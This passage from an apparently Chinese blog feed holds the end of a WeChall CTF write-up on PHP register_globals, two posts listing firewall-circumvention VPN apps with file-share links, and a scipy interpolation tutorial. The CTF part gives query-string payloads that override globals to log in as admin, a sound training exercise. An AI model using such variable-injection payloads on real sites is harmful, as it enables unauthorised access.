class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的程序变量$a未初始化，在register_globals=ON时，在尝试控制$a的值（xxx.php?a=1&amp;b=2），会因为这段代码而出错。</p><p>而当尝试注入“GLOBALS[a]”来覆盖全局变量的值时（xxx.php?GLOBALS[a]=1&amp;b=2），则可以成功控制$a的值，这是因为unset()默认只会销毁局部变量，要销毁全局变量必须要使用$GLOBALS。而在register_globals=OFF时，则无法覆盖到全局变量。</p><blockquote><p>总结：register_globals的意思是注册为全局变量，所以当On的时候，传递过来的值会被直接注册为全局变量而直接使用，当为OFF的时候，就需要到特定的数组中去得到它。unset用于释放给定的变量</p></blockquote></li></ul><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><ul><li><p>查看题目给的php代码，发现register_globals的为on，表示我们可以通过提交url地址来设置全局变量</p></li><li><p>往下面看发现只要login[0]=’admin’ 便可以成功以admin登录，而前面的 if 里面的login初始化由于我们post的密码一定是错误的随意并不会执行</p><p><img src="https://ae01.alicdn.com/kf/H4e1f2cf55c8c4d2fa15e03d5b06b2b01l.jpg" alt></p></li><li><p>所以直接访问</p><blockquote><p><a href="https://www.wechall.net/challenge/training/php/globals/globals.php?login[0]=admin" target="_blank" rel="noopener">https://www.wechall.net/challenge/training/php/globals/globals.php?login[0]=admin</a></p></blockquote><p>即可通过本题。admin不要加引号。。。。。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 竞赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>翻个墙电脑</title>
      <link href="/2019/08/06/2019-dian-nao-fan-ge-qiang/"/>
      <url>/2019/08/06/2019-dian-nao-fan-ge-qiang/</url>
      
        <content type="html"><![CDATA[<h2 id="翻个墙墙-电脑应用"><a href="#翻个墙墙-电脑应用" class="headerlink" title="翻个墙墙-电脑应用"></a>翻个墙墙-电脑应用</h2><p>翻墙的电脑应用目前我知道到有两个，一个是小飞机一个是v2ray，不过最近v2ray的服务器太少了，应用好像也凉了，我就只简绍小飞机露。  </p><p>服务器订阅地址<code>https://raw.githubusercontent.com/ssrsub/ssr/master/ssrsub</code><br>应用下载地址<code>https://pan.baidu.com/s/1H4HWnuM_GXLQdmdk04uc6w</code>  </p><ol><li>双击启动应用，在桌面右下角找到一个小飞机的标志，如果没有应该是折叠起来了，  </li><li>右键点击小飞机，再点击服务器订阅设置，输入服务器订阅网址，之后再点击add(添加)  </li><li>然后更新服务器订阅，节点列表便更新了。  </li><li>也可以右键点击小飞机，扫描二维码直接添加服务器，自己摸索去吧。  </li></ol><p>大家有新的服务器订阅地址，欢迎评论留言哦。  </p><blockquote><p>翻墙千万不要发表对祖国不好的言论,人在做，天在看，国外着几年对大陆的网名都有着洗脑倾向，翻墙不要看新闻，千万不要，看个视频，看个明星就行了。<br>未特殊说明，所有软件的解压密码均为本站网址 <code>ainiya.xyz</code>    </p></blockquote><p>写个博客不容易，可怜可怜博主，点个广告再走呗(✿◕‿◕✿)。</p>]]></content>
      
      
      <categories>
          
          <category> 搞事情 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 翻墙 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手机翻墙</title>
      <link href="/2019/08/06/2019-shou-ji-fan-ge-qiang/"/>
      <url>/2019/08/06/2019-shou-ji-fan-ge-qiang/</url>
      
        <content type="html"><![CDATA[<h2 id="跨越长城-手机版应用"><a href="#跨越长城-手机版应用" class="headerlink" title="跨越长城-手机版应用"></a>跨越长城-手机版应用</h2><p>换个手机把，结果把之前好不容易收集翻墙软件都给弄丢了，于是乎决定写个博客，记录下自己使用过的翻墙软件，谁由好的翻墙软件欢迎评论区留言哦，我会随时更新的，不能用的软件也欢迎大家评论提醒哦。<br>  </p><blockquote><p>注：本文所用应用同一明明为base.apk,因为好多的网盘都吧翻墙软件给禁了。  </p></blockquote><h3 id="Tom-VPN"><a href="#Tom-VPN" class="headerlink" title="Tom VPN"></a>Tom VPN</h3><p>免费，绿色，屏蔽了绝大多数的不好的网站，很适合大众使用，首先推荐使用它<br><a href="https://pan.baidu.com/s/1zKC8Thue3IlP16cu8As6qw" target="_blank" rel="noopener">https://pan.baidu.com/s/1zKC8Thue3IlP16cu8As6qw</a>  </p><h3 id="小明VPN"><a href="#小明VPN" class="headerlink" title="小明VPN"></a>小明VPN</h3><p>和Tom VPN差不多，但速度更快，也是屏蔽了一些网站<br><a href="https://pan.baidu.com/s/1FHe0-gt70a5dWMeShSmDpQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1FHe0-gt70a5dWMeShSmDpQ</a>  </p><h3 id="Wuma-VPN"><a href="#Wuma-VPN" class="headerlink" title="Wuma VPN"></a>Wuma VPN</h3><p>免费，速度比不上Tom vpn 但是节点可以自选，可控性比较强<br><a href="https://pan.baidu.com/s/1dtYwp_Tw4bkqVb4GcEGpIg" target="_blank" rel="noopener">https://pan.baidu.com/s/1dtYwp_Tw4bkqVb4GcEGpIg</a>  </p><h3 id="Thunder-VPN"><a href="#Thunder-VPN" class="headerlink" title="Thunder VPN"></a>Thunder VPN</h3><p>免费，速度还行，可以开通会员，充钱使你强大<br><a href="https://pan.baidu.com/s/1lNFYJlZ4LbIWeA8fjA56Cw" target="_blank" rel="noopener">https://pan.baidu.com/s/1lNFYJlZ4LbIWeA8fjA56Cw</a>  </p><h3 id="Secuer-VPN"><a href="#Secuer-VPN" class="headerlink" title="Secuer VPN"></a>Secuer VPN</h3><p>和Thunder VPN好像用的是一个应用框架，也可以充钱开会员，不过免费的平时搜个东西是够了。<br><a href="https://pan.baidu.com/s/1eg0u74EhPaG1rCw5uitloQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1eg0u74EhPaG1rCw5uitloQ</a>  </p><h3 id="旋风加速器"><a href="#旋风加速器" class="headerlink" title="旋风加速器"></a>旋风加速器</h3><p>网速快，YouTube看视频无压力，关键是免费，但是呢广告比较，emmmm，不太适合女孩子使用。而且还有限时。<br><a href="https://pan.baidu.com/s/142rYD4akTnsz9bTXj0AHhQ" target="_blank" rel="noopener">https://pan.baidu.com/s/142rYD4akTnsz9bTXj0AHhQ</a>  </p><blockquote><p>翻墙千万不要发表对祖国不好的言论,人在做，天在看，国外着几年对大陆的网名都有着洗脑倾向，翻墙不要看新闻，千万不要，看个视频，看个明星就行了。<br>未特殊说明，所有软件的解压密码均为本站网址 <code>ainiya.xyz</code>  </p></blockquote><p>写个博客不容易，可怜可怜博主，点个广告再走呗(✿◕‿◕✿)。</p>]]></content>
      
      
      <categories>
          
          <category> 搞事情 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 翻个墙 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Scipy</title>
      <link href="/2019/07/26/2019-scipy/"/>
      <url>/2019/07/26/2019-scipy/</url>
      
        <content type="html"><![CDATA[<h1 id="Scipy"><a href="#Scipy" class="headerlink" title="Scipy"></a>Scipy</h1><p>numpy 其实是scipy的一部分，后来才从scipy中分离出来。scipy函数库在numpy库的基础上征集了众多数学、科学以及工程计算中常用的函数库。例如线性代数、常微分方程值求解、信号处理、图形处理、稀疏矩阵等等。由于其中涉及的领域众多，只能想到哪里，学到哪里  </p><h2 id="1-插值"><a href="#1-插值" class="headerlink" title="1 插值"></a>1 插值</h2><p>一维插值和二维插值，是最常用的scipy功能之一，也很容易上手  </p><h3 id="1-1-一维插值和样条插值"><a href="#1-1-一维插值和样条插值" class="headerlink" title="1.1 一维插值和样条插值"></a>1.1 一维插值和样条插值</h3><p>下面的例子清楚的展示了线性插值和样条插值之后的数据形态。  </p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np  <span class="token keyword">from</span> scipy <span class="token keyword">import</span> interpolate  x <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>  y <span class="token operator">=</span> np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span>x<span class="token operator">/</span><span class="token number">3.0</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python">x  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9])  </code></pre><pre class="line-numbers language-python"><code class="language-python">y  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([1.        , 0.71653131, 0.51341712, 0.36787944, 0.26359714,         0.1888756 , 0.13533528, 0.09697197, 0.06948345, 0.04978707])  </code></pre><pre class="line-numbers language-python"><code class="language-python">f_linear <span class="token operator">=</span> interpolate<span class="token punctuation">.</span>interp1d<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>  x_new <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0.2</span><span class="token punctuation">)</span>  f_linear<span class="token punctuation">(</span>x_new<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 线性插值  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre><code>array([1.        , 0.94330626, 0.88661252, 0.82991879, 0.77322505,         0.71653131, 0.67590847, 0.63528563, 0.5946628 , 0.55403996,         0.51341712, 0.48430958, 0.45520205, 0.42609451, 0.39698698,         0.36787944, 0.34702298, 0.32616652, 0.30531006, 0.2844536 ,         0.26359714, 0.24865283, 0.23370852, 0.21876422, 0.20381991,         0.1888756 , 0.17816754, 0.16745947, 0.15675141, 0.14604335,         0.13533528, 0.12766262, 0.11998996, 0.11231729, 0.10464463,         0.09697197, 0.09147426, 0.08597656, 0.08047886, 0.07498115,         0.06948345, 0.06554417, 0.0616049 , 0.05766562, 0.05372634])  </code></pre><pre class="line-numbers language-python"><code class="language-python">bs <span class="token operator">=</span> interpolate<span class="token punctuation">.</span>splrep<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>  interpolate<span class="token punctuation">.</span>splev<span class="token punctuation">(</span>x_new<span class="token punctuation">,</span> bs<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 样条插值  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre><code>array([1.        , 0.93571489, 0.8754193 , 0.8189194 , 0.76602135,         0.71653131, 0.67025545, 0.62699994, 0.58657094, 0.54877461,         0.51341712, 0.48031625, 0.44933621, 0.42035284, 0.39324198,         0.36787944, 0.34414628, 0.32194438, 0.30118082, 0.28176271,         0.26359714, 0.24659576, 0.23068846, 0.2158097 , 0.20189393,         0.1888756 , 0.17669225, 0.16529366, 0.15463272, 0.1446623 ,         0.13533528, 0.1266067 , 0.11844022, 0.11080172, 0.10365702,         0.09697197, 0.09071432, 0.0848594 , 0.07938446, 0.07426673,         0.06948345, 0.06501185, 0.06082918, 0.05691267, 0.05323955])  </code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt  <span class="token keyword">from</span> pylab <span class="token keyword">import</span> mpl  mpl<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'FangSong'</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># 指定默认字体  </span>mpl<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'axes.unicode_minus'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span>  <span class="token comment" spellcheck="true"># 解决保存图片是‘-’的显示问题  </span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'figure.dpi'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span> <span class="token comment" spellcheck="true">#分辨率   </span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> label<span class="token operator">=</span>u<span class="token string">'原始数据'</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x_new<span class="token punctuation">,</span> f_linear<span class="token punctuation">(</span>x_new<span class="token punctuation">)</span><span class="token punctuation">,</span> label<span class="token operator">=</span>u<span class="token string">'线性插值'</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x_new<span class="token punctuation">,</span> interpolate<span class="token punctuation">.</span>splev<span class="token punctuation">(</span>x_new<span class="token punctuation">,</span> bs<span class="token punctuation">)</span><span class="token punctuation">,</span> label<span class="token operator">=</span>u<span class="token string">"B-spline插值"</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>legend<span class="token punctuation">(</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://ae01.alicdn.com/kf/H4109e023a3a04b10ab2f873306c31ddfZ.png" alt>  </p><p><strong>样条插值</strong>中包含很多的默认参数，下面简单说明  </p><pre class="line-numbers language-python"><code class="language-python">scipy<span class="token punctuation">.</span>interpolate<span class="token punctuation">.</span>splrep<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> w<span class="token operator">=</span>None<span class="token punctuation">,</span> xb<span class="token operator">=</span>None<span class="token punctuation">,</span> xe<span class="token operator">=</span>None<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> task<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> s<span class="token operator">=</span>None<span class="token punctuation">,</span> t<span class="token operator">=</span>None<span class="token punctuation">,</span> full_output<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> per<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> quiet<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>参数s用来确定平滑点数，通常是m-SQRT(2m),m是曲线点数。如果在插值中不需要平滑应该设定s=0。splrep()输出的是一个3元素的元胞数组（t,c,k）,其中t是曲线点，c是计算出来的系数，k是样条阶数，通常是3阶，但可以通过k改变。  </li></ul><pre class="line-numbers language-python"><code class="language-python">scipy<span class="token punctuation">.</span>interpolate<span class="token punctuation">.</span>splev<span class="token punctuation">(</span>x<span class="token punctuation">,</span> tck<span class="token punctuation">,</span> der<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>其中的der是进行样条计算是需要实际计算到的阶数，必须满足条件der&lt;=k。  </li></ul><h3 id="1-2-二维插值"><a href="#1-2-二维插值" class="headerlink" title="1.2 二维插值"></a>1.2 二维插值</h3><p>在一个房间的地板上按九宫格的位置放置9个传感器，测的温度如下：  </p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np  temp <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  temp  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre><code>array([[26, 28, 26],         [25, 22, 23],         [28, 29, 25]])  </code></pre><p>在不增加传感器的前提下是数据变得平滑  </p><pre class="line-numbers language-python"><code class="language-python">x <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>  y <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>  ip <span class="token operator">=</span> interpolate<span class="token punctuation">.</span>interp2d<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> temp<span class="token punctuation">)</span>  x_new <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>  y_new <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>  temp_new <span class="token operator">=</span> ip<span class="token punctuation">(</span>x_new<span class="token punctuation">,</span> y_new<span class="token punctuation">)</span>  temp_new  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>array([[26.  , 27.  , 28.  , 27.  , 26.  ],         [25.5 , 25.25, 25.  , 24.75, 24.5 ],         [25.  , 23.5 , 22.  , 22.5 , 23.  ],         [26.5 , 26.  , 25.5 , 24.75, 24.  ],         [28.  , 28.5 , 29.  , 27.  , 25.  ]])  </code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt  plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">121</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">122</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>temp_new<span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://ae01.alicdn.com/kf/H9ff2bd3c8b8a40f89394efd129a3a6f6U.png" alt>  </p><h2 id="2-拟合"><a href="#2-拟合" class="headerlink" title="2 拟合"></a>2 拟合</h2><p>在工作中，我们常常需要在途中描绘某些实际数据观察的同时，使用一个曲线来拟合这些实际数据。所谓拟合，计时找出符合数据变化趋势的曲线方程，或者直接绘制出拟合曲线。  </p><h3 id="2-1-使用numpy-polyfit拟合"><a href="#2-1-使用numpy-polyfit拟合" class="headerlink" title="2.1 使用numpy.polyfit拟合"></a>2.1 使用numpy.polyfit拟合</h3><p>下面的代码，基于numpy模块，可以直接绘制处拟合曲线，但无法的到曲线方程，尽管输出了一堆曲线参数。  </p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> numpy  <span class="token keyword">import</span> pylab  <span class="token keyword">def</span> <span class="token function">plot_polynomail_fit</span><span class="token punctuation">(</span>y<span class="token punctuation">,</span> <span class="token operator">*</span>deg<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token triple-quoted-string string">'''      这个函数一次拟合一组数据，但可以对一组数据同时拟合多条曲线并显示      y是一个list，为代拟和的数据      *deg是一个元组，长度不定，里面存放拟合的次数，可以对一组数据拟合出多条直线进行比较      '''</span>      x <span class="token operator">=</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>      COLOR <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">]</span>      temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>      numOfLineFit <span class="token operator">=</span> len<span class="token punctuation">(</span>deg<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 需要拟合的次数列表  </span>    <span class="token keyword">for</span> index<span class="token punctuation">,</span> item <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span>deg<span class="token punctuation">)</span><span class="token punctuation">:</span>          param <span class="token operator">=</span> numpy<span class="token punctuation">.</span>polyfit<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> item<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 曲线参数  </span>        equation <span class="token operator">=</span> numpy<span class="token punctuation">.</span>poly1d<span class="token punctuation">(</span>param<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 曲线方程  </span>        temp<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>param<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 后去曲线参数  </span>        <span class="token keyword">print</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span>          pylab<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span>numOfLineFit<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> index<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>          pylab<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> equation<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'%s--'</span> <span class="token operator">%</span> COLOR<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span>          pylab<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> <span class="token string">'b--'</span><span class="token punctuation">)</span>      pylab<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> temp  <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>      y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">]</span>      plot_polynomail_fit<span class="token punctuation">(</span>y<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>[-0.68406593  7.70304695 13.22802198]  [-0.01981352 -0.35714286  6.32600733 14.20879121]  [ 0.03095862 -0.70090326  4.33530012 -4.0849359  17.71153846]  </code></pre><p><img src="https://ae01.alicdn.com/kf/H20749464511b423eaf234f0eca7db508u.png" alt>  </p><h3 id="2-2-使用scipyoptimize-curve-fit拟合"><a href="#2-2-使用scipyoptimize-curve-fit拟合" class="headerlink" title="2.2 使用scipyoptimize.curve_fit拟合"></a>2.2 使用scipyoptimize.curve_fit拟合</h3><p>scipy提供的拟合，貌似需要先确定带参数的曲线方程，然后由scipy求解方程，返回曲线参数。我们试试 以上面的一组数据为例使用scipy拟合曲线。  </p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np  <span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt  <span class="token keyword">from</span> scipy <span class="token keyword">import</span> optimize   x <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>  y <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://ae01.alicdn.com/kf/H5f8fd0ef3a1b481c98706097c438f3a6r.png" alt>  </p><p>可以看出，曲线近似正弦函数。构建函数y=asin(xpi/6+b)+c, 使用scipy的optimize.cure_fit可以求出a,b,c的值：  </p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fmax</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> a<span class="token operator">*</span>np<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>x<span class="token operator">*</span>np<span class="token punctuation">.</span>pi<span class="token operator">/</span><span class="token number">6</span><span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token operator">+</span>c  fita<span class="token punctuation">,</span> fitb <span class="token operator">=</span> optimize<span class="token punctuation">.</span>curve_fit<span class="token punctuation">(</span>fmax<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  xn <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">0.1</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>xn<span class="token punctuation">,</span> fmax<span class="token punctuation">(</span>xn<span class="token punctuation">,</span> fita<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> fita<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> fita<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://ae01.alicdn.com/kf/Hfb0ae2740072427e9c5af874d9e7fc0fD.png" alt>  </p><h2 id="3-求解非线性方程组"><a href="#3-求解非线性方程组" class="headerlink" title="3 求解非线性方程组"></a>3 求解非线性方程组</h2><p>在数学建模中，需要对一些稀奇古怪的方程（组）求解， matlab自然是首选，但Matlab不是免费的，scipy则为我们提供了免费的午餐！scipy.optimize库中的fsolve函数可以用来对非线性方程组（组）进行求解。它的基本形式如下：<br><br><code>fsolve(func, x0)</code><br><br>func(x)是计算方程组误差的函数，它的参数x是一个矢量，表示方程组的各个位置数的一组可能的解，func返回将x代入方程组之后的得到的误差；x0为未知数矢量的初始值。<br>  </p><p>我们先来求解一个简单的方程：$\sin(x)-\cos(x)=0.2$</p>  <pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> scipy<span class="token punctuation">.</span>optimize <span class="token keyword">import</span> fsolve  <span class="token keyword">import</span> numpy <span class="token keyword">as</span> np  <span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">:</span>      x <span class="token operator">=</span> float<span class="token punctuation">(</span>A<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token punctuation">[</span>np<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">-</span> np<span class="token punctuation">.</span>cos<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0.2</span><span class="token punctuation">]</span>  